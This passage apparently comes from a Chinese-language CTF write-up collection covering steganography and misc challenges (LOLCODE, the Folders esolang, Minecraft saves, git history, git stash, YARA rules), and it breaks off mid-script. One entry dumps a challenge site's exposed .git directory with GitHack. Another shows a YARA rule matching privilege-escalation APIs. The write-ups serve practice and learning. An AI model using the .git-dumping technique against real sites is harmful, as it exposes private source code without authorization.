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\n</code></pre> <p>Base64 \u89e3\u7801\u540e\u5f97\u5230\u4e00\u4e2a ZIP \u6587\u4ef6</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0\u7b2c A \u5217\u4e0b\u7b2c\u4e8c\u884c\u5904 04 \u8fd9\u4e2a\u5730\u65b9\u6587\u4ef6\u540d\u957f\u5ea6\u6709\u95ee\u9898\uff0c\u6211\u4eec\u7ed9\u5b83\u6539\u56de\u53bb\u6539\u6210 08</p> <p></p> <p>\u7834\u89e3\u4f2a\u52a0\u5bc6\u540e\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-26/","title":"LOLCODE \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-26/#lolcode-\u9690\u5199","title":"LOLCODE \u9690\u5199","text":"<p>\u6253\u5361\u6587\u4ef6</p> <p></p> <p>LOLCODE \u662f\u4e00\u79cd\u8bd9\u8c10\u5e7d\u9ed8\u7684 \u602a\u8bde\u578b\u7f16\u7a0b\u8bed\u8a00\uff08Esoteric Programming Language\uff09\uff0c\u8bde\u751f\u4e8e 2007 \u5e74\uff0c\u7531 Adam Lindsay \u8bbe\u8ba1\u3002\u7075\u611f\u6765\u6e90\u4e8e\u65e9\u671f\u4e92\u8054\u7f51\u6d41\u884c\u7684 LOLCats \u6587\u5316\uff0c\u90a3\u79cd\u7528\u6ed1\u7a3d\u9519\u8bef\u82f1\u8bed\uff08Engrish\uff09\u5199\u51fa\u6765\u7684\u8ff7\u56e0\u56fe\uff0c\u5982 \u201cI CAN HAS CHEEZBURGER?\u201d\u3002</p> <p>\u8fd9\u95e8\u8bed\u8a00\u672c\u8d28\u662f\u4e3a\u4e86\u641e\u7b11\uff0c\u8bed\u8a00\u7ed3\u6784\u6a21\u4eff\u8fd9\u79cd\u201c\u732b\u8bed+\u9519\u522b\u5b57+\u7f51\u6c11\u9ed1\u8bdd\u201d\uff0c\u4e0d\u5177\u5907\u5b9e\u7528\u6027\uff0c\u4f46\u5177\u5907\u5b8c\u6574\u7684\u7f16\u7a0b\u8bed\u6cd5\u7279\u5f81</p> \u529f\u80fd C\u8bed\u8a00\u5199\u6cd5 LOLCODE \u5199\u6cd5 \u5b9a\u4e49\u53d8\u91cf <code>int x = 5;</code> <code>I HAS A X ITZ 5</code> \u8f93\u51fa <code>printf(\"hi\");</code> <code>VISIBLE \"hi\"</code> \u6761\u4ef6 <code>if ... else</code> <code>O RLY? YA RLY NO WAI</code> \u5faa\u73af <code>while</code> <code>IM IN YR LOOP ... IM OUTTA YR LOOP</code> \u8f93\u5165 <code>scanf</code> <code>GIMMEH VAR</code> <p>\u89e3\u5bc6\u5f97\u5230 Key</p> <p></p> <p>\u89e3\u538b\u7f29\u5305\u5f97\u5230 1.docx\uff0c\u5185\u5bb9\u63d0\u793a AES\uff0c\u65e0\u5176\u4ed6\u5185\u5bb9\uff0c\u5c1d\u8bd5\u5c06 docx \u4fee\u6539\u6210 .zip \u89e3\u538b\u53d1\u73b0 fllllllllll1ag.txt</p> <p></p> <p>Emoji \u7b26\u53f7\u52a0\u4e0a\u4e4b\u524d\u63d0\u793a\u7684 AES\uff0c\u731c\u6d4b\u4e3a Emoji-AES\uff0cKey \u7ee7\u7eed\u731c\u6d4b\u4e3a\u4e4b\u524d\u7684 Key\uff0c\u6709\u70b9\u5c0f\u8111\u6d1e Rotation=4</p> <p></p> <p></p>"},{"location":"Misc/Chapter1/1-27/","title":"Folders  \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-27/#folders-\u9690\u5199","title":"Folders  \u9690\u5199","text":"<p>\u4e00\u4e2a\u6d41\u91cf\u5305\uff0cwireshark \u6253\u5f00\uff0c\u8ffd\u8e2a\u6700\u540e\u4e00\u4e2a TCP \u6d41</p> <p>\u8bfb\u4e00\u4e0b\u8bf7\u6c42\uff0c\u53d1\u73b0\u662f\u8fdb\u5165\u5230\u4e86 flag \u76ee\u5f55\u4e0b\u6267\u884c\u4e86 tree \u547d\u4ee4</p> <p>\u5f97\u5230\u7684 response \u662f gzip \u538b\u7f29\u540e\u7684\uff0c\u53d6\u51fa\u5185\u5bb9\uff0c\u7136\u540e\u89e3\u538b\u5f97\u5230 tree \u7684\u7ed3\u679c</p> <pre><code>flag\n`-- New\\ folder\n    |-- New\\ folder\n    |   |-- New\\ folder\n    |   |-- New\\ folder\\ (2)\n    |   |-- New\\ folder\\ (3)\n    |   `-- New\\ folder\\ (4)\n    `-- New\\ folder\\ (2)\n        |-- New\\ Folder\\ (3)\n        |   |-- New\\ folder\n        |   |   |-- New\\ folder\n        |   |   |   |-- New\\ folder\n        |   |   |   |-- New\\ folder(2)\n        |   |   |   |   `-- New\\ folder\n        |   |   |   |-- New\\ folder(3)\n        |   |   |   |   `-- New\\ folder\n        |   |   |   `-- New\\ folder(4)\n        |   |   |       `-- New\\ folder\n        |   |   `-- New\\ folder(2)\n        |   |       |-- New\\ folder\n        |   |       |-- New\\ folder(2)\n        |   |       |   `-- New\\ folder\n        |   |       |-- New\\ folder(3)\n        |   |       |   `-- New\\ folder\n        |   |       `-- New\\ folder(4)\n        |   |-- New\\ folder(10)\n...\n</code></pre> <p>\u4e0d\u96be\u53d1\u73b0\uff0c\u662f\u4e00\u5806\u7a7a\u6587\u4ef6\u5939\u5f62\u6210\u7684\u7ed3\u6784</p> <p>\u7136\u540e\u5c31\u56de\u60f3\u8d77\u4e86\u4e4b\u524d\u770b\u5230\u7684\u4e00\u79cd esolang \u53eb Folders\uff0c\u662f\u901a\u8fc7\u4e00\u5806\u5d4c\u5957\u7684\u7a7a\u6587\u4ef6\u5939\u7f16\u5199\u7684\uff0c\u8fd9\u4e2a\u53ef\u80fd\u5c31\u662f</p> <p>\u5148\u91cd\u5efa\u8d77\u8fd9\u4e2a\u76ee\u5f55\u7ed3\u6784\uff0c\u6ca1\u627e\u5230\u9006 tree \u7684\u73b0\u6210\u5de5\u5177\uff0c\u53ea\u597d\u624b\u5199\u4e00\u4e2a\u4e86</p> <pre><code>import os\nfrom pathlib import Path\n\nwith open(\"test\", \"r\") as f:\n    tree = f.readlines()\n\npath = Path(\"flag\")\nlast_level = -1\n\nfor each in tree:\n    level = each.find(\"N\")//4\n    if level &lt; last_level:\n        path = path.parent\n    if level == last_level:\n        path = path.parent\n    diff = last_level - level\n    for _ in range(diff):\n        path = path.parent\n    path = path / each.strip().replace(\"\\\\\", \"\")\n    last_level = level\n    os.makedirs(path)\n</code></pre> <p>\u5f97\u5230 flag\uff1a<code>vnctf{d23903879df57503879bcdf1efc141fe}</code></p> <p>\u53c2\u8003\u94fe\u63a5</p>"},{"location":"Misc/Chapter1/1-28/","title":"Minecraft JSON \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-28/#minecraft-json-\u9690\u5199","title":"Minecraft JSON \u9690\u5199","text":"<p>\u8fd9\u9898\u8981\u5728\u300a\u6211\u7684\u4e16\u754c\u300b\u8fd9\u4e2a\u6e38\u620f\u91cc\u9762\u505a\u4efb\u52a1\uff0c\u62ff\u5230\u6700\u540e\u4e00\u672c\u4e66\u624d\u80fd\u62ff\u5230 flag</p> <p>Everything \u641c\u7d22 <code>flag</code> \u5173\u952e\u5b57\uff0c\u53d1\u73b0 <code>.minecraft\\saves\\Where is the flag</code> \u5b58\u6863\u76ee\u5f55</p> <p></p> <p>\u627e\u5230\u4efb\u52a1</p> <p></p> <p>\u5728 JSON \u6587\u4ef6\u91cc\u627e\u6709\u5173\u4e66\u7684\u7ebf\u7d22</p> <p></p> <p></p> <p>\u4e00\u5171\u6709\u56db\u4e2a\uff0c\u7ed3\u5408\u8d77\u6765\u5c31\u662f <code>GKCTF{w3lc0me_t0_9kctf_2021_Check_1n}</code></p>"},{"location":"Misc/Chapter1/1-29/","title":"Git \u5386\u53f2\u7248\u672c\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-29/#git-\u5386\u53f2\u7248\u672c\u9690\u5199","title":"Git \u5386\u53f2\u7248\u672c\u9690\u5199","text":"<p>\u7f51\u9875\u5565\u4e5f\u6ca1\u6709\uff0c\u5148\u626b\u4ed6\u76ee\u5f55</p> <p></p> <p>\u6709\u4e2a flag.txt\uff0c\u4f46\u662f\u662f\u5047\u7684</p> <p></p> <p>\u8fd8\u6709\u4e2a .git \u6587\u4ef6\uff0c\u4e0b\u8f7d\u4e0b\u6765\u67e5\u770b</p> <p></p> <p>git show \u67e5\u770b\u5386\u53f2\u7248\u672c\u627e\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-3/","title":"\u6570\u636e\u9006\u5e8f\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-3/#\u6570\u636e\u9006\u5e8f\u9690\u5199","title":"\u6570\u636e\u9006\u5e8f\u9690\u5199","text":"<p>\u539f\u7406\u662f\u901a\u8fc7\u5206\u6790\u6587\u4ef6\u672b\u5341\u516d\u8fdb\u5236\u6570\u636e\u63a8\u6d4b\u51fa\u6570\u636e\u662f\u5012\u5e8f\u7684 </p> <p>\u653e\u5165 WinHex \u4e2d\u53d1\u73b0\u6587\u4ef6\u672b\u5c3e\u662f PNG</p> <p></p> <p>\u7f16\u5199\u811a\u672c\u5c06\u6570\u636e\u9006\u5e8f\u6392\u5217\uff0c\u7136\u540e</p> <pre><code>def reverse_hex_string(hex_str):\n    # \u5c06\u5b57\u7b26\u4e32\u6309\u4e24\u4e2a\u5b57\u7b26\u5206\u7ec4\uff0c\u7136\u540e\u9006\u5e8f\n    reversed_hex_str = ''.join([hex_str[i:i + 2] for i in range(0, len(hex_str), 2)][::-1])\n\n    file_name = '\u5341\u516d\u8fdb\u5236\u9006\u5e8f\u7ed3\u679c.txt'\n\n    # \u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u5b57\u8282\u5bf9\u8c61\n    reversed_hex_str = bytes.fromhex(reversed_hex_str)\n\n    # \u6253\u5f00\u6587\u4ef6\u5199\u5165\n    with open(file_name, 'wb') as f:\n        f.write(reversed_hex_str)\n\n\ndef main():\n    # \u6587\u4ef6\u5341\u516d\u8fdb\u5236\u6570\u636e\n    hex_string = \"\"\n\n    reverse_hex_string(hex_string)\n\n\nif __name__ == '__main__':\n    main()\n</code></pre> <p>\u91cd\u547d\u540d\u540e\u6253\u5f00\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-30/","title":"Git Stash \u9690\u5199","text":""},{"location":"Misc/Chapter1/1-30/#git-stash-\u9690\u5199","title":"Git Stash \u9690\u5199","text":"<p>stash \u7528\u4e8e\u4fdd\u5b58 git \u5de5\u4f5c\u72b6\u6001\u5230 git \u6808\uff0c\u5728\u9700\u8981\u7684\u65f6\u5019\u518d\u6062\u590d</p> <p>\u5c1d\u8bd5\u8bbf\u95ee\u654f\u611f\u76ee\u5f55\uff0c\u53d1\u73b0 .git \u76ee\u5f55</p> <pre><code>http://challenge-397308928286c868.sandbox.ctfhub.com:10800/.git/config\n</code></pre> <p>\u5229\u7528 GitHack \u5de5\u5177\u5c06\u7f51\u7ad9\u6e90\u4ee3\u7801 Clone \u5230\u672c\u5730</p> <pre><code>python2 GitHack.py http://challenge-397308928286c868.sandbox.ctfhub.com:10800/.git/\n</code></pre> <p>\u6267\u884c <code>git stash list</code> \u53d1\u73b0\u6709 stash</p> <p><code>git stash list</code> \u7528\u4e8e**\u67e5\u770b Git \u6682\u5b58\u6808\uff08stash stack\uff09\u4e2d\u7684\u6240\u6709\u4fdd\u5b58\u9879**</p> <p></p> <p>\u6267\u884c <code>git stash pop</code> \u53d1\u73b0\u4ece git \u6808\u4e2d\u5f39\u51fa\u6765\u4e00\u4e2a\u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u5c31\u662f flag</p> <p><code>git stash pop</code> \u7528\u4e8e**\u5c06\u6700\u8fd1\u7684 stash \u5e94\u7528\u5230\u5f53\u524d\u5206\u652f\uff0c\u5e76\u81ea\u52a8\u4ece stash \u5217\u8868\u4e2d\u5220\u9664\u8be5\u8bb0\u5f55**</p> <p></p>"},{"location":"Misc/Chapter1/1-31/","title":"YARA \u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b","text":""},{"location":"Misc/Chapter1/1-31/#yara-\u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b","title":"YARA \u6076\u610f\u8f6f\u4ef6\u68c0\u6d4b","text":"<p>YARA = Yet Another Ridiculous Acronym</p> <p>\u662f\u4e00\u4e2a\u7528\u4e8e \u6076\u610f\u4ee3\u7801\u8bc6\u522b\u4e0e\u5206\u7c7b \u7684\u5f00\u6e90\u5de5\u5177</p> <p>\u901a\u8fc7\u7f16\u5199 \u89c4\u5219\uff08rule\uff09 \u6765\u5339\u914d\u6587\u4ef6\u6216\u5185\u5b58\u4e2d\u7684 \u5b57\u7b26\u4e32\u3001\u5b57\u8282\u6a21\u5f0f\u3001\u6b63\u5219\u8868\u8fbe\u5f0f</p> <p>\u5b89\u5168\u7814\u7a76\u5458\u5e38\u79f0\u5b83\u4e3a \u6076\u610f\u8f6f\u4ef6\u5206\u6790\u5e08\u7684\u745e\u58eb\u519b\u5200</p> <pre><code>rule test\n{\n    strings:\n        $str1 = \"UPX0\" wide ascii\n        $str2 = \"AdjustTokenPrivileges\" wide ascii\n        $str3 = \"LookupPrivilegeValueW\" wide ascii\n\n    condition:\n        $str1 or ($str2 and $str3)\n}\n</code></pre> <p><code>rule test</code></p> <ul> <li> <p>\u5b9a\u4e49\u4e86\u4e00\u4e2a\u89c4\u5219\uff0c\u540d\u5b57\u53eb <code>test</code></p> </li> <li> <p>\u5f53 YARA \u626b\u63cf\u6587\u4ef6\u65f6\uff0c\u5982\u679c\u8fd9\u4e2a\u89c4\u5219\u89e6\u53d1\uff0c\u5c31\u4f1a\u8f93\u51fa\uff1a</p> </li> </ul> <pre><code>test suspicious.exe\n</code></pre> <p>\u8fd9\u91cc\u5b9a\u4e49\u4e86\u8981\u5339\u914d\u7684\u5b57\u7b26\u4e32</p> <ul> <li><code>$str1 = \"UPX0\" wide ascii</code></li> <li>\u5339\u914d\u6587\u4ef6\u4e2d\u662f\u5426\u51fa\u73b0 <code>\"UPX0\"</code> \u8fd9\u4e2a\u5b57\u7b26\u4e32</li> <li><code>ascii</code> = \u666e\u901a ASCII \u5b57\u7b26\u4e32</li> <li><code>wide</code> = UTF-16LE \u5bbd\u5b57\u8282\u5b57\u7b26\u4e32</li> <li>\u4e5f\u5c31\u662f\u8bf4\uff0cYARA \u4f1a\u540c\u65f6\u5339\u914d <code>\"UPX0\"</code> \u548c <code>\"U\\x00P\\x00X\\x000\\x00\"</code></li> <li><code>$str2 = \"AdjustTokenPrivileges\" wide ascii</code></li> <li>\u5339\u914d Windows API \u51fd\u6570\u540d <code>\"AdjustTokenPrivileges\"</code>\uff0c\u901a\u5e38\u7528\u4e8e\u4fee\u6539\u8fdb\u7a0b\u6743\u9650</li> <li><code>$str3 = \"LookupPrivilegeValueW\" wide ascii</code></li> <li>\u5339\u914d API <code>\"LookupPrivilegeValueW\"</code>\uff0c\u5e38\u914d\u5408\u4e0a\u4e00\u4e2a API \u4e00\u8d77\u7528\u6765\u63d0\u5347\u6743\u9650</li> </ul> <p><code>condition:</code> \u90e8\u5206</p> <p>\u8fd9\u662f\u5224\u65ad\u903b\u8f91\uff0c\u51b3\u5b9a\u4ec0\u4e48\u65f6\u5019\u89e6\u53d1</p> <pre><code>$str1 or ($str2 and $str3)\n</code></pre> <p>\u610f\u601d\u662f\uff1a</p> <ul> <li>\u60c5\u51b5 A\uff1a\u6587\u4ef6\u91cc\u51fa\u73b0 <code>$str1</code>\uff08\u5373 <code>\"UPX0\"</code>\uff09</li> <li>\u60c5\u51b5 B\uff1a\u6587\u4ef6\u91cc\u540c\u65f6\u51fa\u73b0 <code>$str2</code> \u548c <code>$str3</code>\uff08\u5373 <code>\"AdjustTokenPrivileges\"</code> + <code>\"LookupPrivilegeValueW\"</code>\uff09</li> </ul> <p>\u53ea\u8981\u6ee1\u8db3 A \u6216 B\uff0c\u8fd9\u4e2a\u89c4\u5219\u5c31\u4f1a\u89e6\u53d1</p> <p><code>\"AdjustTokenPrivileges\"</code> + <code>\"LookupPrivilegeValueW\"</code> \u2192 \u8fd9\u662f Windows \u7a0b\u5e8f\u91cc\u5178\u578b\u7684 \u63d0\u6743 API \u7ec4\u5408</p> <p>\u5f00\u542f\u7ec8\u7aef\u4f1a\u7ed9\u51fa\u547d\u4ee4\uff0c\u5339\u914d\u89c4\u5219\u5199\u5165 <code>rules.txt</code>\u4e2d</p> <p></p>"},{"location":"Misc/Chapter1/1-4/","title":"DMG \u6587\u4ef6\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-4/#dmg-\u6587\u4ef6\u9690\u5199","title":"DMG \u6587\u4ef6\u9690\u5199","text":"<p>DMG \u6587\u4ef6\u662f Mac \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4e00\u79cd\u78c1\u76d8\u6620\u50cf\u6587\u4ef6\u683c\u5f0f </p> <p>\u865a\u62df\u673a\u4e2d\u6709 MacOS \u7684\u8bdd\u76f4\u63a5\u62d6\u5165\u6ca1\u6709\u5219\u53ea\u80fd\u7f51\u4e0a\u627e\u5176\u4ed6\u5de5\u5177\u4e86</p> <p></p> <p>\u6253\u5f00\u53d1\u73b0\u9700\u8981\u5bc6\u7801</p> <p></p> <p>\u5728 WinHex \u4e2d\u53d1\u73b0\u5b57\u7b26\u4e32</p> <p></p> <p>\u5c1d\u8bd5\u4e00\u4e0b\u89e3\u538b\u7f29</p> <p></p> <p>\u53ef\u4ee5\u6210\u529f\u6253\u5f00\u6587\u4ef6</p> <p></p>"},{"location":"Misc/Chapter1/1-5/","title":"\u6587\u4ef6\u683c\u5f0f\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-5/#\u6587\u4ef6\u683c\u5f0f\u9690\u5199","title":"\u6587\u4ef6\u683c\u5f0f\u9690\u5199","text":"<p>\u5177\u4f53\u539f\u7406\u5c31\u662f\u4fee\u6539\u6587\u4ef6\u683c\u5f0f\u6765\u9690\u85cf\u539f\u6765\u7684\u771f\u5b9e\u6587\u4ef6 </p> <p>\u524d\u9762\u7684\u6b65\u9aa4\u53ef\u4ee5\u53c2\u8003 Zip \u660e\u6587\u653b\u51fb\u90a3\u4e00\u8282</p> <p>\u8fd9\u91cc\u8bb2\u89e3\u672c\u8282\u91cd\u8981\u5185\u5bb9</p> <p>\u6253\u5f00 word \u6ca1\u7ebf\u7d22</p> <p></p> <p>\u6254\u8fdb WinHex \u4e2d\u53d1\u73b0\u6587\u4ef6\u5934\u662f\u538b\u7f29\u6587\u4ef6\uff0c\u5c06\u6587\u4ef6 word \u4fee\u6539\u4e3a zip</p> <p></p> <p>\u89e3\u538b\u7f29\u540e\u6253\u5f00\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter1/1-6/","title":"Snow \u6587\u4ef6\u9690\u5199","text":""},{"location":"Misc/Chapter1/1-6/#snow-\u6587\u4ef6\u9690\u5199","title":"Snow \u6587\u4ef6\u9690\u5199","text":"<p>\u524d\u9762\u6b65\u9aa4\u5c31\u662f\u7f16\u5199\u4e00\u4e2a\u65f6\u95f4\u6233\u811a\u672c</p> <p>\u5982\u679c\u79d2\u6570\u5927\u4e8e 40\uff0c\u5219\u8bb0\u4e3a 1\uff0c\u5426\u5219\u5373\u4e3a 0</p> <p>\u518d\u5c06\u5f97\u5230\u7684\u4e8c\u8fdb\u5236\u8f6c\u53e6\u5b58\u4e3a 7z \u6587\u4ef6</p> <p>\u5f97\u5230 snow.txt</p> <pre><code># ctf_check.py\nimport os, time, string, sys\nfrom pathlib import Path\n\nWORK_DIR = r'CTF\\files'   # \u2190 \u6539\u6210\u4f60\u7684\u76ee\u5f55\uff08\u4e0d\u8981\u4ee5 / \u7ed3\u5c3e\u4e5f\u53ef\u4ee5\uff09\nOUT_PREFIX = Path(WORK_DIR) / \"result_variant\"\n\ndef build_hex_from_mtime():\n    flag = ''\n    out = ''\n    for i in range(1936):\n        path = os.path.join(WORK_DIR, f\"{i}.txt\")\n        if not os.path.exists(path):\n            raise FileNotFoundError(f\"\u7f3a\u5c11\u6587\u4ef6: {path}\")\n        file_time = 